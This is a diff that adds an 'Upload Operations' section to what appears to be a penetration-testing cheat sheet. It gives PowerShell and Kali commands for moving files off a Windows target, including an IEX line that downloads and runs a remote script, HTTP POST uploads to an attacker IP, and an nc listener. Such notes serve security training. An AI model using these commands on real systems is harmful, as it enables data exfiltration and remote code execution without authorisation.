@@ -69,3 +69,66 @@ On Windows target, download file :
 ```
 
 ## Upload Operations
+
+### Powershell Base64 Encode & Decode
+
+On Windows target, encode file : 
+
+```
+1) Encode and copy base64 string :
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+2) Get MD5 hash : 
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
+
+On Kali : 
+
+```
+$ echo [PASTE BASE64] | base64 -d > hosts
+$ md5sum hosts
+```
+
+### Powershell Web Uploads
+
+On Kali, create HTTP server : 
+
+```
+$ pip3 install uploadserver
+$ python3 -m uploadserver
+```
+
+On Windows target, download file : 
+
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+### Powershell Base64 web upload
+
+On windows target, encoded file in base64 : 
+
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+```
+
+On Kali, start listener : 
+
+```
+$ nc -lvnp 8000
+```
+
+On windows target send the POST request : 
+
+```
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+And finally, on kali copy/paste the base64 for decoded : 
+
+```
+$ echo <base64> | base64 -d -w 0 > hosts
+```
+
